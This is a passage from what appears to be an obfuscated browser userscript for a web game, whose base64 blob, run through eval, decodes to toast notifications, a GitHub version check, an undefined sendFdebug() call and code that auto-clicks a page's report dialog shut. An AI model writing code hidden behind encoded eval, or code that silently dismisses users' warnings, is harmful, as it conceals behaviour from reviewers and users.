93VG9hc3RzY3BnKCkgewogIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpICE9PSBudWxsKSB7CiAgICBjaGVja2JveDMuY2hlY2tlZCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24zIikgPT09ICJ0cnVlIjsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBBdWRpb1BsYXlJbnN0YW50U291bmQoImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDkwNTMwNDc5MDgzNjMwNjcyL2g0MnZ3Y2Qtbm90aWZpY2F0aW9uLTFfdk1xaFZsdFMubXAzIiwgMSk7CiAgICB9CiAgfQogICAgLy8gQ3JlYXRlIHRoZSB0b2FzdCBjb250YWluZXIKICAgIHZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCAjNENBRjUwIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICB2YXIgc3RhdHVzQmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwpzdGF0dXNCYXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKc3RhdHVzQmFyLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKc3RhdHVzQmFyLnN0eWxlLmxlZnQgPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS50cmFuc2l0aW9uID0gIndpZHRoIDVzIGVhc2UtaW4tb3V0IjsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoc3RhdHVzQmFyKTsKCgovLyBVcGRhdGUgdGhlIHdpZHRoIG9mIHRoZSBzdGF0dXMgYmFyIGFzIGl0IGNvdW50cyBkb3duCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwp9LCAwKTsKICAgIAovLyBBZGQgdGhlIGN1c3RvbSBCQ00gaWNvbgp2YXIgaWNvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwppY29uLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwppY29uLnN0eWxlLndpZHRoID0gIjIzcHgiOwppY29uLnN0eWxlLmhlaWdodCA9ICIyM3B4IjsKaWNvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKaWNvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICItMzBweCI7Cmljb24uc3R5bGUubWFyZ2luQm90dG9tID0gIi01cHgiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChpY29uKTsKCi8vIEFkZCB0aGUgdGV4dCBtZXNzYWdlCnZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwp0ZXh0LnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CnRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKdGV4dC5pbm5lckhUTUwgPSAiQWN0aW9uIFN1Y2Nlc3NmdWxseSBFeGVjdXRlZCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHRleHQpOwoKICAgIAogIAogICAgLy8gQXBwZW5kIHRoZSB0b2FzdCBjb250YWluZXIgdG8gdGhlIGJvZHkKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwogIAogICAgLy8gU2hvdyB0aGUgdG9hc3Qgd2l0aCBhIGZhZGUgaW4gYW5pbWF0aW9uCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKICAgIH0sIDApOwogIAogICAgLy8gSGlkZSB0aGUgdG9hc3Qgd2l0aCBhIGZhZGUgb3V0IGFuaW1hdGlvbgogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgIH0sIDUwMDApOwogIAogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIH0sIDU1MDApOwogICAgc2VuZEZkZWJ1ZygpOwoKICB9CiAgCgovL1RoZSBVcGRhdGUgdG9hc3QKZnVuY3Rpb24gc2hvd1RvYXN0VXBkYXRlKCkgewovLyBDcmVhdGUgdGhlIHRvYXN0IGNvbnRhaW5lcgp2YXIgdG9hc3RDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKdG9hc3RDb250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3R0b20gPSAiNXB4IjsKdG9hc3RDb250YWluZXIuc3R5bGUucmlnaHQgPSAiNXB4IjsKdG9hc3RDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKdG9hc3RDb250YWluZXIuc3R5bGUuY29sb3IgPSAiIzE0MTQxNCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCAjZjIyYzJjIjsKdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJveFNoYWRvdyA9ICIycHggMnB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpIjsKdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKdG9hc3RDb250YWluZXIuc3R5bGUuekluZGV4ID0gIjk5OSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjVzIGVhc2UtaW4tb3V0IjsKdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKdG9hc3RDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwp2YXIgc3RhdHVzQmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwpzdGF0dXNCYXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKc3RhdHVzQmFyLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKc3RhdHVzQmFyLnN0eWxlLmxlZnQgPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS50cmFuc2l0aW9uID0gIndpZHRoIDVzIGVhc2UtaW4tb3V0IjsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoc3RhdHVzQmFyKTsKCi8vIFVwZGF0ZSB0aGUgd2lkdGggb2YgdGhlIHN0YXR1cyBiYXIgd2hpbGUgY291bnRpbmcgZG93bgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKfSwgMCk7CgovLyBDcmVhdGUgdGhlIGNsb3NlIGJ1dHRvbgp2YXIgY2xvc2VCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKY2xvc2VCdXR0b24uc3R5bGUuYm9yZGVyID0gIm5vbmUiOwpjbG9zZUJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kID0gIm5vbmUiOwpjbG9zZUJ1dHRvbi5zdHlsZS50b3AgPSAiNXB4IjsKY2xvc2VCdXR0b24uc3R5bGUucmlnaHQgPSAiNXB4IjsKY2xvc2VCdXR0b24uc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKY2xvc2VCdXR0b24uc3R5bGUuZm9udFNpemUgPSAiMTZweCI7CmNsb3NlQnV0dG9uLnN0eWxlLm1hcmdpbkxlZnQgPSAiLTJweCI7CmNsb3NlQnV0dG9uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjBweCI7CmNsb3NlQnV0dG9uLmlubmVySFRNTCA9ICJYIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoY2xvc2VCdXR0b24pOwoKLy8gQ2xvc2UgdGhlIHRvYXN0IHdoZW4gdGhlIGNsb3NlIGJ1dHRvbiBpcyBjbGlja2VkCmNsb3NlQnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICB9LCA1MDApOwp9KTsKCi8vIEJDTUUgbG9nbyB0byB0aGUgbGVmdAp2YXIgaWNvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwppY29uLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwppY29uLnN0eWxlLndpZHRoID0gIjIzcHgiOwppY29uLnN0eWxlLmhlaWdodCA9ICIyM3B4IjsKaWNvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKaWNvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICItMzBweCI7Cmljb24uc3R5bGUubWFyZ2luQm90dG9tID0gIi01cHgiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChpY29uKTsKCi8vIFVwZGF0ZSBjbGllbnQgbWVzc2FnZQp2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKdGV4dC5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwp0ZXh0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMzVweCI7CnRleHQuaW5uZXJIVE1MID0gIk5ldyB1cGRhdGUgZGV0ZWN0ZWQsIHJlZnJlc2ggQkMgdG8gdXBkYXRlIHRvIFYyLjAuNiI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHRleHQpOwoKLy8gQXBwZW5kIHRoZSB0b2FzdCBjb250YWluZXIgdG8gQkMncyBib2R5CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwoKLy8gU2hvdyB0aGUgdG9hc3Qgd2l0aCBhIGZhZGUgaW4gYW5pbWF0aW9uCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKfSwgMCk7CgovLyBIaWRlIHRoZSB0b2FzdCB3aXRoIGEgZmFkZSBvdXQgYW5pbWF0aW9uCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKfSwgNTAwMDAwMCk7CgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7Cn0sIDU1MDAwMDApOwoKfQoKICAvLyBFbmQgb2YgVXBkYXRlIE1hbmVncmUgVG9hc3RfX19fX19fX19fX19fX19fCgogIGNvbnN0IGVsZW1lbnRUb1JlbW92ZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2RpdltzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyBpbnNldDogNSU7IGJhY2tncm91bmQ6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBwYWRkaW5nOiAxZW07Il0nKTsKCiAgc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgICBjb25zdCBlbGVtZW50VG9SZW1vdmUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXZbc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgaW5zZXQ6IDUlOyBiYWNrZ3JvdW5kOiB3aGl0ZTsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgcGFkZGluZzogMWVtOyJdJyk7CiAgICBpZiAoZWxlbWVudFRvUmVtb3ZlKSB7CiAgICAgIGNvbnN0IGJ1dHRvbnMgPSBlbGVtZW50VG9SZW1vdmUucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uW3N0eWxlPSJjdXJzb3I6IHBvaW50ZXI7Il0nKTsKICAgICAgaWYgKGJ1dHRvbnMpIHsKICAgICAgICBidXR0b25zLmZvckVhY2goYnV0dG9uID0+IGJ1dHRvbi5jbGljaygpKTsKICAgICAgfQogICAgfQogIH0sIDEpOwogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgY29uc3QgZWxlbWVudFRvUmVtb3ZlID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignZGl2W3N0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IGluc2V0OiA1JTsgYmFja2dyb3VuZDogd2hpdGU7IGRpc3BsYXk6IGZsZXg7IGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47IHBhZGRpbmc6IDFlbTsiXScpOwogICAgaWYgKGVsZW1lbnRUb1JlbW92ZSkgewogICAgICBjb25zdCBidXR0b25zID0gZWxlbWVudFRvUmVtb3ZlLnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbltzdHlsZT0iY3Vyc29yOiBwb2ludGVyOyJdJyk7CiAgICAgIGlmIChidXR0b25zKSB7CiAgICAgICAgYnV0dG9ucy5mb3JFYWNoKGJ1dHRvbiA9PiB7CiAgICAgICAgICBpZiAoYnV0dG9uLnRleHRDb250ZW50ID09PSAiRG8gbm90IHNob3cgdGhpcyByZXBvcnQgYWdhaW4gdW5sZXNzIHNvbWV0aGluZyBjaGFuZ2VzIiB8fCBidXR0b24udGV4dENvbnRlbnQgPT09ICJDbG9zZSIpIHsKICAgICAgICAgICAgYnV0dG9uLmNsaWNrKCk7CiAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgIH0KICAgIH0KICB9LCA1MDApOwoKICAvLyBEZWZpbmUgdGhlIFVSTCBvZiB0aGUgcmF3IEdpdEh1YiBwYWdlIHRvIGNoZWNrCmNvbnN0IHVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkNNUzcvQkNNL21haW4vdXBkYXRlbWFuYWdlci5qcyc7Ci8vIERlZmluZSB0aGUgbWF4aW11bSB2ZXJzaW9uIG51bWJlciBhbGxvd2VkCmNvbnN0IG1heFZlcnNpb24gPSAxNTsKLy8gRGVmaW5lIGEgZmxhZyB0byBrZWVwIHRyYWNrIG9mIHdoZXRoZXIgdGhlIGFsZXJ0IGhhcyBiZWVuIHRyaWdnZXJlZApsZXQgYWxlcnRUcmlnZ2VyZWQgPSBmYWxzZTsKLy8gRGVmaW5lIGEgZnVuY3Rpb24gdG8gY2hlY2sgdGhlIHZlcnNpb24gYW5kIHNob3cgdGhlIGFsZXJ0IGlmIG5lY2Vzc2FyeQpmdW5jdGlvbiBjaGVja1ZlcnNpb24oKSB7CiAgZmV0Y2godXJsKQogICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogICAgLnRoZW4odmVyc2lvbiA9PiB7CiAgICAgIGlmIChwYXJzZUludCh2ZXJzaW9uKSA+IG1heFZlcnNpb24gJiYgIWFsZXJ0VHJpZ2dlcmVkKSB7CiAgICAgICAgc2hvd1RvYXN0VXBkYXRlKCk7CiAgICAgICAgYWxlcnRUcmlnZ2VyZWQgPSB0cnVlOwogICAgICB9CiAgICB9KQogICAgLmNhdGNoKGVycm9yID0+IGNvbnNvbGUuZXJyb3IoZXJyb3IpKTsKfQovLyBDaGVjayBmb3IgdXBkYXRlcyBldmVyeSA1IHNlY29uZHMKc2V0SW50ZXJ2YWwoY2hlY2tWZXJzaW9uLCA1MDAwKTsKfQp9KQo=')
if (sprc) {
eval(sprc);
}
/*
25
*/
